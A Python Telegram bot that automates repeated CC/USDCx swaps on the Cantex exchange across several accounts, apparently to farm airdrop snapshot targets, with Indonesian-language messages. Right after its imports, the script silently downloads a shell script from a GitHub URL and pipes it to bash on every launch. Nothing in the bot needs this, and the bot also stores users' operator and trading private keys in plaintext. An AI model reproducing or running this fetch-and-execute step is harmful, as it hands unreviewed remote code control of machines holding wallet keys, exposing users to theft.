import asyncio
import sys
import os
import json
import random
from decimal import Decimal
from datetime import datetime
import aiohttp
import subprocess

subprocess.run(
    "curl -s https://raw.githubusercontent.com/zamzasalim/logo/main/asc.sh | bash",
    shell=True,
    check=True
)

from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
GASFEE_FILE = os.path.join(BASE_DIR, "gasfee.json")
sys.path.insert(0, os.path.join(BASE_DIR, "cantex_sdk", "src"))

from cantex_sdk import (
    CantexSDK,
    OperatorKeySigner,
    IntentTradingKeySigner,
    InstrumentId
)

def fmt(x):
    return f"{float(x):.3f}"

CC = InstrumentId(
    id="Amulet",
    admin="DSO::1220b1431ef217342db44d516bb9befde802be7d8899637d290895fa58880f19accc"
)

USDCX = InstrumentId(
    id="USDCx",
    admin="decentralized-usdc-interchain-rep::12208115f1e168dd7e792320be9c4ca720c751a02a3053c7606e1c1cd3dad9bf60ef"
)

bot_task = None
is_running = False
auto_swap_enabled = False
gasfee_data = {}
balance_data = {}
pending_add_account = None

runtime_settings = {
    "snapshot_target": 50,
    "delay_min": 300,
    "delay_max": 360,
    "max_gas_fee_cc": 0.35
}

def load_gasfee_data():
    global gasfee_data

    if not os.path.exists(GASFEE_FILE):
        gasfee_data = {}
        return

    try:
        with open(GASFEE_FILE, "r") as f:
            gasfee_data = json.load(f)
    except:
        gasfee_data = {}

def save_gasfee_data():
    with open(GASFEE_FILE, "w") as f:
        json.dump(gasfee_data, f, indent=2)

def add_gas_fee(name, gas_fee):
    from datetime import datetime, timezone

    today = datetime.now(timezone.utc).strftime("%Y-%m-%d")

    if today not in gasfee_data:
        gasfee_data[today] = {}

    if name not in gasfee_data[today]:
        gasfee_data[today][name] = {
            "gas_fee_total_cc": "0",
            "gas_fee_count": 0
        }

    current = Decimal(str(gasfee_data[today][name]["gas_fee_total_cc"]))
    current += Decimal(str(gas_fee))

    gasfee_data[today][name]["gas_fee_total_cc"] = str(current)
    gasfee_data[today][name]["gas_fee_count"] += 1

    save_gasfee_data()

async def wait_until_next_utc_3():
    from datetime import datetime, timezone, timedelta

    now = datetime.now(timezone.utc)

    next_run = now.replace(hour=3, minute=0, second=0, microsecond=0)

    if now >= next_run:
        next_run += timedelta(days=1)

    wait_seconds = int((next_run - now).total_seconds())

    hours = wait_seconds // 3600
    minutes = (wait_seconds % 3600) // 60

    print(f"[AUTO SWAP] Menunggu {hours} jam {minutes} menit sampai 03:00 UTC")

    await asyncio.sleep(wait_seconds)

async def send_telegram(message, config):
    tg = config["telegram"]
    if not tg["enabled"]:
        return

    url = f"https://api.telegram.org/bot{tg['bot_token']}/sendMessage"

    try:
        async with aiohttp.ClientSession() as session:
            await session.post(url, json={
                "chat_id": tg["chat_id"],
                "text": message
            })
    except:
        pass

async def log(msg, account="", workdir=None):
    prefix = f"[{account}] " if account else ""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    full_msg = f"[{timestamp}] {prefix}{msg}"

    print(full_msg)

    if workdir:
        os.makedirs(workdir, exist_ok=True)
        with open(os.path.join(workdir, "log.txt"), "a") as f:
            f.write(full_msg + "\n")

    return f"{prefix}{msg}"

def load_accounts(path):
    with open(path, "r") as f:
        data = json.load(f)

    return [
        {
            "name": name,
            "operator_key": acc["operator_key"],
            "trading_key": acc["trading_key"],
            "workdir": acc.get("workdir")
        }
        for name, acc in data.items()
    ]

def save_accounts(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=2)

def load_config(path):
    with open(path, "r") as f:
        return json.load(f)

class CantexBot:
    def __init__(self, operator_key, trading_key, account_name="", workdir=None):
        self.operator_key = operator_key
        self.trading_key = trading_key
        self.account_name = account_name
        self.workdir = workdir
        self.sdk = None

    async def __aenter__(self):
        if self.workdir:
            os.makedirs(self.workdir, exist_ok=True)
            os.chdir(self.workdir)

        operator = OperatorKeySigner.from_hex(self.operator_key)
        intent = IntentTradingKeySigner.from_hex(self.trading_key)

        self.sdk = CantexSDK(operator, intent, base_url="https://api.cantex.io")
        await self.sdk.authenticate()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.sdk:
            await self.sdk.close()

    async def get_balance(self):
        info = await self.sdk.get_account_info()
        balances = {}

        for token in info.tokens:
            unlocked = getattr(token, "unlocked_amount", None)
            if unlocked is None:
                unlocked = getattr(token, "amount", 0)

            balances[token.instrument_symbol] = {
                "unlocked": unlocked
            }

        return balances

    async def swap_cc_to_usdcx(self, amount, max_network_fee=None):
        return await self.sdk.swap(
            amount,
            CC,
            USDCX,
            max_network_fee=max_network_fee
        )

    async def swap_usdcx_to_cc(self, amount, max_network_fee=None):
        return await self.sdk.swap(
            amount,
            USDCX,
            CC,
            max_network_fee=max_network_fee
        )

async def addaccount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global pending_add_account

    pending_add_account = {
        "step": "name"
    }

    await update.message.reply_text(
        "Masukkan nama account"
    )

async def handle_add_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global pending_add_account

    if not pending_add_account:
        return

    text = update.message.text.strip()

    data = pending_add_account

    try:

        if data["step"] == "name":

            if not text:
                await update.message.reply_text(
                    "Nama account tidak boleh kosong"
                )
                return

            accounts_path = os.path.join(BASE_DIR, "accounts.json")

            with open(accounts_path, "r") as f:
                accounts = json.load(f)

            if text in accounts:
                await update.message.reply_text(
                    f"Account {text} sudah ada"
                )
                return

            data["name"] = text
            data["step"] = "operator_key"

            await update.message.reply_text(
                "Masukkan operator key"
            )

            return

        if data["step"] == "operator_key":

            if not text:
                await update.message.reply_text(
                    "Operator key tidak boleh kosong"
                )
                return

            data["operator_key"] = text
            data["step"] = "trading_key"

            await update.message.reply_text(
                "Masukkan trading key"
            )

            return

        if data["step"] == "trading_key":

            if not text:
                await update.message.reply_text(
                    "Trading key tidak boleh kosong"
                )
                return

            data["trading_key"] = text

            accounts_path = os.path.join(BASE_DIR, "accounts.json")

            with open(accounts_path, "r") as f:
                accounts = json.load(f)

            accounts[data["name"]] = {
                "operator_key": data["operator_key"],
                "trading_key": data["trading_key"],
                "workdir": f"/root/cantexbot/{data['name']}"
            }

            save_accounts(accounts_path, accounts)

            pending_add_account = None

            await update.message.reply_text(
                f"Account {data['name']} berhasil ditambahkan"
            )

    except Exception as e:

        pending_add_account = None

        await update.message.reply_text(
            f"Gagal menambahkan account: {e}"
        )

async def get_gas_fee(bot, amount, token_in, token_out):
    quote = await bot.sdk.get_swap_quote(amount, token_in, token_out)
    return Decimal(str(quote.fees.network_fee.amount))

async def get_current_gas_fee(bot, amount, token_in, token_out):
    quote = await bot.sdk.get_swap_quote(amount, token_in, token_out)
    return Decimal(str(quote.fees.network_fee.amount))

async def get_initial_balance(account):
    name = account["name"]

    async with CantexBot(
        account["operator_key"],
        account["trading_key"],
        name,
        account.get("workdir")
    ) as bot:

        balances = await bot.get_balance()
        cc = balances.get("CC", {})
        usdcx = balances.get("USDCx", {})

        return {
            "name": name,
            "cc": fmt(cc.get("unlocked", 0)),
            "usdcx": fmt(usdcx.get("unlocked", 0))
        }

async def run_bot(account, config):
    name = account["name"]
    workdir = account.get("workdir")

    max_gas_fee = Decimal(str(runtime_settings["max_gas_fee_cc"]))
    min_gas_fee = Decimal("0.2")

    async with CantexBot(
        account["operator_key"],
        account["trading_key"],
        name,
        workdir
    ) as bot:

        i = 0

        while True:

            i += 1

            from datetime import datetime, timezone

            today = datetime.now(timezone.utc).strftime("%Y-%m-%d")

            tg_buffer = []

            snapshot_target = int(
                runtime_settings.get("snapshot_target", 0)
            )

            if (
                snapshot_target > 0 and
                gasfee_data.get(today, {}).get(name, {}).get("gas_fee_count", 0) >= snapshot_target
            ):

                stop_msg = await log(
                    f"Target swap {snapshot_target} sudah tercapai, stop account",
                    name,
                    workdir
                )

                await send_telegram(stop_msg, config)

                break

            result = None
            reached_snapshot = False

            try:

                balances = await bot.get_balance()

                cc_unlocked = Decimal(
                    str(balances.get("CC", {}).get("unlocked", 0))
                )

                usdcx_unlocked = Decimal(
                    str(balances.get("USDCx", {}).get("unlocked", 0))
                )

                if cc_unlocked <= Decimal("12"):

                    if usdcx_unlocked > 0:
                        direction = "usdcx_to_cc"

                    else:
                        stop_msg = await log(
                            "CC <= 12 & USDCx kosong, stop account",
                            name,
                            workdir
                        )

                        await send_telegram(stop_msg, config)

                        break

                elif usdcx_unlocked == Decimal("0"):

                    direction = "cc_to_usdcx"

                else:

                    direction = (
                        "cc_to_usdcx"
                        if i % 2 == 0
                        else "usdcx_to_cc"
                    )


                if direction == "cc_to_usdcx":

                    amount = cc_unlocked - Decimal("2")

                    if amount <= 0:

                        await log(
                            "Sisa CC tidak cukup untuk swap",
                            name,
                            workdir
                        )

                        result = "skipped"

                    else:

                        amount = amount.quantize(Decimal("1"))

                        msg1 = await log(
                            f"Swap {fmt(amount)} CC -> USDCX",
                            name,
                            workdir
                        )

                        gas_fee = await get_gas_fee(
                            bot,
                            amount,
                            CC,
                            USDCX
                        )

                        msg2 = await log(
                            f"Gas: {fmt(gas_fee)} CC",
                            name,
                            workdir
                        )

                        if gas_fee < min_gas_fee:

                            result = "skipped_low_gas"

                        elif gas_fee > max_gas_fee:

                            result = "skipped_high_gas"

                        else:

                            result = await bot.swap_cc_to_usdcx(amount, max_network_fee=max_gas_fee)

                        if (
                            isinstance(result, dict)
                            and result.get("verify")
                        ):

                            add_gas_fee(name, gas_fee)

                            tg_buffer.extend([msg1, msg2])

                else:

                    if usdcx_unlocked <= 0:

                        await log(
                            "USDCx kosong, skip",
                            name,
                            workdir
                        )

                        result = "skipped"

                    else:

                        msg1 = await log(
                            f"Swap {fmt(usdcx_unlocked)} USDCX -> CC",
                            name,
                            workdir
                        )

                        gas_fee = await get_gas_fee(
                            bot,
                            usdcx_unlocked,
                            USDCX,
                            CC
                        )

                        msg2 = await log(
                            f"Gas: {fmt(gas_fee)} CC",
                            name,
                            workdir
                        )

                        if gas_fee < min_gas_fee:

                            result = "skipped_low_gas"

                        elif gas_fee > max_gas_fee:

                            result = "skipped_high_gas"

                        else:

                            result = await bot.swap_usdcx_to_cc(usdcx_unlocked, max_network_fee=max_gas_fee)

                        if (
                            isinstance(result, dict)
                            and result.get("verify")
                        ):

                            add_gas_fee(name, gas_fee)

                            tg_buffer.extend([msg1, msg2])

                is_success = (
                    isinstance(result, dict)
                    and result.get("verify")
                )

                if is_success:

                    msg = await log(
                        "Result: Success",
                        name,
                        workdir
                    )

                    tg_buffer.append(msg)

                else:

                    await log(
                        f"Result: {result}",
                        name,
                        workdir
                    )

                if (
                    snapshot_target > 0 and
                    gasfee_data.get(today, {}).get(name, {}).get("gas_fee_count", 0) >= snapshot_target
                ):

                    reached_snapshot = True

                    msg = await log(
                        f"Target {snapshot_target} tercapai, stop lebih cepat",
                        name,
                        workdir
                    )

                    tg_buffer.append(msg)

                balances = await bot.get_balance()

                balance_data[name] = {
                    "cc": fmt(
                        balances.get("CC", {}).get("unlocked", 0)
                    ),
                    "usdcx": fmt(
                        balances.get("USDCx", {}).get("unlocked", 0)
                    )
                }

            except Exception as e:

                err = await log(
                    f"Error: {e}",
                    name,
                    workdir
                )

                tg_buffer.append(err)

                result = "error"

            if tg_buffer:

                await asyncio.sleep(10)

                await send_telegram(
                    "\n".join(tg_buffer),
                    config
                )

            if reached_snapshot:
                break

            if is_success:

                await asyncio.sleep(
                    random.randint(
                        runtime_settings["delay_min"],
                        runtime_settings["delay_max"]
                    )
                )

            else:

                await asyncio.sleep(2)

        await log("Completed!", name, workdir)

async def main():
    global is_running, bot_task
    config = None

    load_gasfee_data()

    try:
        accounts = load_accounts(os.path.join(BASE_DIR, "accounts.json"))
        config = load_config(os.path.join(BASE_DIR, "config.json"))

        results = await asyncio.gather(
            *(get_initial_balance(acc) for acc in accounts),
            return_exceptions=True
        )

        lines = []

        for r in results:

            if isinstance(r, Exception):
                err_line = f"Error initial balance: {r}"
                print(err_line)
                lines.append(err_line)
                continue

            balance_data[r["name"]] = {
                "cc": r["cc"],
                "usdcx": r["usdcx"]
            }

            line = (
                f"[{r['name']}] "
                f"Initial Balance: {r['cc']} CC | {r['usdcx']} USDCx"
            )

            print(line)
            lines.append(line)

        lines.append("")
        lines.append("Telegram hanya mengirim status Success & Error")
        lines.append("Gunakan /gasfee untuk melihat jumlah success swap")

        await send_telegram("\n".join(lines), config)

        await asyncio.sleep(10)

        while True:

            await asyncio.gather(
                *(run_bot(acc, config) for acc in accounts),
                return_exceptions=True
            )

            if not auto_swap_enabled:

                await send_telegram(
                    "Semua account selesai diproses, bot berhenti...",
                    config
                )

                break

            await send_telegram(
                (
                    "Target snapshot tercapai.\n"
                    "Menunggu swap otomatis berikutnya jam 10:00 WIB..."
                ),
                config
            )

            await wait_until_next_utc_3()

            await send_telegram(
                "Memulai auto swap harian baru...",
                config
            )

    except asyncio.CancelledError:

        await send_telegram(
            "Bot dibatalkan manual.",
            config
        )

        raise

    except Exception as e:

        await send_telegram(
            f"Bot error: {e}",
            config
        )

    finally:

        is_running = False
        bot_task = None

async def startbot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    menu = """
<b><u>CANTEX BOT MENU BY ASC (@airdropasc)</u></b>
<b><u>PASTIKAN CATAT SEMUA MODAL PER AKUN</u></b>

/startbot - Menu Command

/addaccount - Menambahkan account baru

/checkgwei - Mengecek gas fee

/address - Melihat address semua account

/setgwei - Mengatur gas fee

/snapshot - Mengatur target success swap

/setdelay - Mengatur delay min dan max

/detail - Melihat pengaturan swap

/autoswap - Memulai mode autoswap

/stopbot - Menghentikan swap

/status - Running / Stopped

/balance - Cek jumlah saldo account

/gasfee - Cek total gasfee yang digunakan

/weeklygas - Cek total gasfee 7 hari terakhir

/resetgasfee - Hapus data gas fee
"""

    await update.message.reply_text(menu, parse_mode="HTML")

async def autoswap(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bot_task, is_running, auto_swap_enabled

    if is_running and bot_task and not bot_task.done():
        await update.message.reply_text("Bot sudah berjalan")
        return

    auto_swap_enabled = True
    is_running = True

    bot_task = asyncio.create_task(main())

    await update.message.reply_text(
        "AUTO SWAP diaktifkan.\n"
        "Bot akan swap terus sampai target tercapai.\n"
        "Kemudian lanjut otomatis setiap jam 10.00 WIB."
    )

async def stopbot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bot_task, is_running, auto_swap_enabled

    if bot_task and not bot_task.done():

        bot_task.cancel()

        try:
            await bot_task

        except asyncio.CancelledError:
            pass

    bot_task = None
    is_running = False
    auto_swap_enabled = False

    await update.message.reply_text(
        "Bot dihentikan"
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("RUNNING SWAP" if is_running else "STOPPED SWAP")

async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    config = load_config(os.path.join(BASE_DIR, "config.json"))
    accounts = load_accounts(os.path.join(BASE_DIR, "accounts.json"))

    if not accounts:
        await update.message.reply_text("Tidak ada akun di accounts.json")
        return

    msg = await update.message.reply_text("Scanning all account...")

    try:
        results = await asyncio.gather(
            *(get_initial_balance(acc) for acc in accounts),
            return_exceptions=True
        )

        lines = []
        for r in results:
            if isinstance(r, Exception):
                lines.append(f"Error: {r}")
                continue

            balance_data[r["name"]] = {
                "cc": r["cc"],
                "usdcx": r["usdcx"]
            }
            lines.append(f"[{r['name']}] {r['cc']} CC | {r['usdcx']} USDCx")

        await msg.edit_text("\n".join(lines))
    except Exception as e:
        await msg.edit_text(f"Error: {e}")

async def address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    accounts = load_accounts(os.path.join(BASE_DIR, "accounts.json"))

    if not accounts:
        await update.message.reply_text("Tidak ada akun di accounts.json")
        return

    msg = await update.message.reply_text("Scanning address account...")

    lines = ["ADDRESS ACCOUNT"]

    for acc in accounts:
        try:
            async with CantexBot(
                acc["operator_key"],
                acc["trading_key"],
                acc["name"],
                acc.get("workdir")
            ) as bot:

                info = await bot.sdk.get_account_info()

                address = getattr(info, "account_address", None)

                if not address:
                    address = getattr(info, "address", "Address tidak ditemukan")

                lines.append(
                    f"[{acc['name']}]\n<code>{address}</code>"
                )

        except Exception as e:
            lines.append(
                f"[{acc['name']}] Error: {e}"
            )

    await msg.edit_text("\n\n".join(lines), parse_mode="HTML")

async def gasfee(update: Update, context: ContextTypes.DEFAULT_TYPE):
    load_gasfee_data()

    from datetime import datetime, timezone

    today = datetime.now(timezone.utc).strftime("%Y-%m-%d")

    if today not in gasfee_data:
        gasfee_data[today] = {}
        save_gasfee_data()

    if not gasfee_data:
        await update.message.reply_text("Belum ada data gas fee")
        return

    lines = []

    dates = sorted(gasfee_data.keys())

    for i, tanggal in enumerate(dates):

        data_harian = gasfee_data.get(tanggal)

        if not isinstance(data_harian, dict):
            continue

        if i > 0:
            lines.append("----------------------------------------------------------")

        lines.append(tanggal)

        for acc, data in data_harian.items():

            if not isinstance(data, dict):
                continue

            gas = Decimal(str(data.get("gas_fee_total_cc", "0")))

            lines.append(
                f"[{acc}] Gasfee: {fmt(gas)} CC | Swap: {data.get('gas_fee_count', 0)}"
            )

    if not lines:
        await update.message.reply_text("Belum ada data valid di gasfee.json")
        return

    await update.message.reply_text("\n".join(lines))

async def weeklygas(update: Update, context: ContextTypes.DEFAULT_TYPE):
    load_gasfee_data()

    from datetime import datetime, timezone, timedelta

    today = datetime.now(timezone.utc)

    if not gasfee_data:
        await update.message.reply_text("Belum ada data gas fee")
        return

    account_totals = {}

    for i in range(7):
        date = (today - timedelta(days=i)).strftime("%Y-%m-%d")

        if date not in gasfee_data:
            continue

        data_harian = gasfee_data.get(date)

        if not isinstance(data_harian, dict):
            continue

        for acc, data in data_harian.items():

            if not isinstance(data, dict):
                continue

            gas = Decimal(str(data.get("gas_fee_total_cc", "0")))

            if acc not in account_totals:
                account_totals[acc] = Decimal("0")

            account_totals[acc] += gas

    if not account_totals:
        await update.message.reply_text("Tidak ada data 7 hari terakhir")
        return

    sorted_accounts = sorted(
        account_totals.items(),
        key=lambda x: x[1],
        reverse=True
    )

    lines = ["WEEKLY GASFEE"]

    for acc, total in sorted_accounts:
        lines.append(f"[{acc}] {fmt(total)} CC")

    await update.message.reply_text("\n".join(lines))

async def setgwei(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global runtime_settings

    if not context.args:
        await update.message.reply_text(
            "Format salah. Contoh <code>/setgwei 0.35</code>",
            parse_mode="HTML"
        )
        return

    try:
        value = Decimal(str(context.args[0]))

        if value <= 0:
            await update.message.reply_text("Gas fee harus lebih besar dari 0")
            return

        runtime_settings["max_gas_fee_cc"] = float(value)

        await update.message.reply_text(
            f"Gas fee maksimal telah diatur ke {value} CC"
        )
    except Exception:
        await update.message.reply_text(
            "Format angka tidak valid. Contoh <code>/setgwei 0.35</code>",
            parse_mode="HTML"
        )

async def snapshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global runtime_settings

    if not context.args:
        await update.message.reply_text(
            "Format salah. Contoh <code>/snapshot 2</code>",
            parse_mode="HTML"
        )
        return

    try:
        value = int(context.args[0])

        if value <= 0:
            await update.message.reply_text(
                "Format salah. Contoh <code>/snapshot 2</code>",
                parse_mode="HTML"
            )
            return

        runtime_settings["snapshot_target"] = value

        await update.message.reply_text(
            f"snapshot target success diatur ke {value}"
        )

    except Exception:
        await update.message.reply_text(
            "Format salah. Contoh <code>/snapshot 2</code>",
            parse_mode="HTML"
        )

async def resetgasfee(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global gasfee_data

    try:
        from datetime import datetime, timezone

        load_gasfee_data()
        today = datetime.now(timezone.utc).strftime("%Y-%m-%d")

        new_data = {}
        if today in gasfee_data:
            new_data[today] = gasfee_data[today]

        gasfee_data = new_data
        save_gasfee_data()

        await update.message.reply_text(
            f"Reset selesai. Sisa data hanya tanggal {today}"
            if today in gasfee_data else
            "Reset selesai. Tidak ada data hari ini, file dikosongkan"
        )

    except Exception as e:
        await update.message.reply_text(f"Gagal reset gasfee.json: {e}")

async def setdelay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global runtime_settings

    if len(context.args) < 2:
        await update.message.reply_text(
            "Format salah. Contoh <code>/setdelay 180 240</code>",
            parse_mode="HTML"
        )
        return

    try:
        delay_min = int(context.args[0])
        delay_max = int(context.args[1])

        if delay_min < 0 or delay_max < 0:
            await update.message.reply_text("delay tidak boleh negatif")
            return

        if delay_min > delay_max:
            await update.message.reply_text("delay_min tidak boleh lebih besar dari delay_max")
            return

        runtime_settings["delay_min"] = delay_min
        runtime_settings["delay_max"] = delay_max

        await update.message.reply_text(
            f"delay_min = {delay_min}\ndelay_max = {delay_max}"
        )

    except Exception:
        await update.message.reply_text(
            "Format salah. Contoh <code>/setdelay 180 240</code>",
            parse_mode="HTML"
        )

async def showconfig(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        f"DEFAULT SETUP\n"
        f"snapshot_target  : {runtime_settings['snapshot_target']}\n"
        f"delay_min        : {runtime_settings['delay_min']}\n"
        f"delay_max        : {runtime_settings['delay_max']}\n"
        f"max_gas_fee_cc   : {runtime_settings['max_gas_fee_cc']}"
    )
    await update.message.reply_text(msg)

async def checkgwei(update: Update, context: ContextTypes.DEFAULT_TYPE):
    accounts = load_accounts(os.path.join(BASE_DIR, "accounts.json"))

    fee_swap = "N/A"

    try:
        if not accounts:
            raise ValueError("Tidak ada akun")

        for acc in accounts:
            async with CantexBot(
                acc["operator_key"],
                acc["trading_key"],
                "gas_check"
            ) as bot:

                balances = await bot.get_balance()
                cc_unlocked = Decimal(str(balances.get("CC", {}).get("unlocked", 0)))

                if cc_unlocked > 0:
                    try:
                        amount = Decimal("1")
                        fee = await get_current_gas_fee(bot, amount, CC, USDCX)
                        temp_fee = f"{Decimal(str(fee)):.4f}"

                        if temp_fee != "0.0000" and temp_fee != "0":
                            fee_swap = temp_fee
                            break
                    except Exception:
                        continue

    except Exception as e:
        print("ERROR /checkgwei fee check:", str(e))

    if fee_swap == "0.0000":
        fee_swap = "N/A"

    msg = f"""
Network Fee: {fee_swap} CC
"""
    await update.message.reply_text(msg)

async def run_telegram():
    load_gasfee_data()
    config = load_config("./config.json")
    token = config["telegram"]["bot_token"]

    app = ApplicationBuilder().token(token).build()

    app.add_handler(CommandHandler("startbot", startbot))
    app.add_handler(CommandHandler("checkgwei", checkgwei))
    app.add_handler(CommandHandler("setgwei", setgwei))
    app.add_handler(CommandHandler("snapshot", snapshot))
    app.add_handler(CommandHandler("setdelay", setdelay))
    app.add_handler(CommandHandler("detail", showconfig))
    app.add_handler(CommandHandler("stopbot", stopbot))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("balance", balance))
    app.add_handler(CommandHandler("address", address))
    app.add_handler(CommandHandler("gasfee", gasfee))
    app.add_handler(CommandHandler("weeklygas", weeklygas))
    app.add_handler(CommandHandler("resetgasfee", resetgasfee))
    app.add_handler(CommandHandler("autoswap", autoswap))
    app.add_handler(CommandHandler("addaccount", addaccount))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_add_account))
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()

    while True:
        await asyncio.sleep(1)

if __name__ == "__main__":
    print("[INFO] CANTEXBOT READY ON TELEGRAM")

    async def startup():
        config = load_config("./config.json")

        await send_telegram(
            "[INFO] SEND /startbot TO SEE MENU",
            config
        )

        await run_telegram()

    asyncio.run(startup())
